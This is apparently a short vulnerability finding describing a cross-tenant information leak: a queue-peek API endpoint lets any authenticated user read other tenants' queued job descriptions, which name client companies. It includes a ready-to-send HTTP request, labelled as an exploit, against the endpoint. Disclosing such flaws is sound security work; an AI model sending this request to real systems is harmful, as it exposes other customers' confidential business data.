diagnosis: peek_queue_jobs_view allows any logged-in user to inspect queued tasks from shared Redis queues. Because jobs contain descriptions with sensitive customer identifiers and company names (e.g., 'Syncing QuickBooks data for Acme Corp'), unauthorized tenants can monitor queue traffic, volume, and identify active clients of other tenants.
exploit_request:
GET /api/tasks/queue/sync_tasks/peek/?offset=0&length=20 HTTP/1.1
Host: worker-control.cloud-integrator.net
Cookie: sessionid=valid_authenticated_user_cookie
Accept: application/json
